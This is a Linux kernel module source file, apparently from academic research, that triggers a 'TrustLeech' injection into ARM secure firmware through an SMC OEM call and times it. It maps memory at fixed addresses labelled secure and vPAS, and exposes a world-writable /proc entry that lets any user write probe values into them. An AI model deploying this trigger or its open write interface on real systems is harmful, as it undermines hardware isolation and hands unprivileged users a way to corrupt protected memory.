#include "linux/sched/task.h"
#include "linux/smp.h"
#include <linux/arm-smccc.h>
#include <linux/io.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/proc_fs.h>
#include <linux/uaccess.h>
#include <linux/sched/signal.h>
#include <uapi/asm-generic/errno-base.h>

#define CALL_OEM_VAL(func_num)                                    \
	ARM_SMCCC_CALL_VAL(ARM_SMCCC_FAST_CALL, ARM_SMCCC_SMC_64, \
			   ARM_SMCCC_OWNER_OEM, (func_num))

static struct proc_dir_entry *trustleech_proc;

static volatile int *secure_mem;
static volatile int *vpas_mem;

ssize_t proc_write(struct file *file, const char __user *ubuf, size_t count,
		   loff_t *ppos)
{
	char buffer[30];
	if (count > sizeof(buffer) - 1)
		return -EFBIG;

	if (copy_from_user(buffer, ubuf, count))
		return -EFAULT;

	buffer[count] = '\0';
	if (buffer[count - 1] == '\n')
		buffer[count - 1] = '\0';

	if (strcmp(buffer, "probe-secure") == 0) {
		*secure_mem = 0xdeadbeef;
		return count;
	} else if (strcmp(buffer, "probe-vpas") == 0) {
		*vpas_mem = 0xdeadbeef;
		return count;
	}

	return -EINVAL;
}

static const struct proc_ops proc_fops = {
	.proc_write = proc_write,
};

static int __init trustleech_init(void)
{
	int ret = 0;

	trustleech_proc = proc_create("trustleech", 0666, NULL, &proc_fops);
	if (!trustleech_proc) {
		printk(KERN_ERR "Failed to create /proc/trustleech\n");
		ret = -ENOMEM;
		goto out;
	}

	vpas_mem = memremap(0xC0000000, 64 * 1024, MEMREMAP_WB);
	if (!vpas_mem) {
		printk(KERN_ERR "Failed to map vPAS memory\n");
		ret = -EFAULT;
		goto out;
	}

	secure_mem = memremap(0x0e000000, 64 * 1024, MEMREMAP_WB);
	if (!secure_mem) {
		printk(KERN_ERR "Failed to map secure memory\n");
		ret = -EFAULT;
		goto out;
	}

	struct arm_smccc_res res = { .a0 = 0 };

	const unsigned long call_val = CALL_OEM_VAL(0);
	printk(KERN_INFO "Triggering injection (function = 0x%lx)\n", call_val);
	ktime_t start, end;
	signed long long elapsed_ns;

	start = ktime_get();
	arm_smccc_smc(call_val, 0, 0, 0, 0, 0, 0, 0, &res);

	end = ktime_get();
	elapsed_ns = ktime_to_ns(ktime_sub(end, start));
	printk(KERN_INFO "Injection execution time: %lld ns\n", elapsed_ns);
	// printk(KERn_INFO "Injection done, took \n", call_val);
	// printk(KERN_INFO "Debug output:\n");
	// struct task_struct *task = &init_task;
	//
	// printk(KERN_INFO "task: 0x%llx next: 0x%llx", (uint64_t)task,
	//        (uint64_t)task->tasks.next);
	// printk(KERN_INFO "Name %s Pid %d", task->comm, task->pid);
	// for_each_process(task) {
	// 	printk(KERN_INFO "task: 0x%llx next: 0x%llx", (uint64_t)task,
	// 	       (uint64_t)task->tasks.next);
	// 	printk(KERN_INFO "Name %s Pid %d", task->comm, task->pid);
	// }
out:
	return ret;
}

static void call_exit(void* info) {
    (void)info;

	struct arm_smccc_res res = { .a0 = 0 };
  	arm_smccc_hvc(CALL_OEM_VAL(1), 0, 0, 0, 0, 0, 0, 0, &res);

}

static void __exit trustleech_exit(void)
{
	if (trustleech_proc)
		proc_remove(trustleech_proc);

	if (vpas_mem)
		memunmap((void *)vpas_mem);

	if (secure_mem)
		memunmap((void *)secure_mem);

	printk(KERN_INFO "Triggering TrustLeech cleanup");
	ktime_t start, end;
	signed long long elapsed_ns;

	start = ktime_get();
    on_each_cpu(call_exit, NULL, 1);
    
	end = ktime_get();
	elapsed_ns = ktime_to_ns(ktime_sub(end, start));
	printk(KERN_INFO "Removal execution time: %lld ns\n", elapsed_ns);
}

module_init(trustleech_init);
module_exit(trustleech_exit);

MODULE_AUTHOR("Paul Bergmann <paul.bergmann@fau.de>");
MODULE_DESCRIPTION("This driver triggers the TrustLeech injection");
MODULE_VERSION("1.0");
MODULE_LICENSE("GPL");
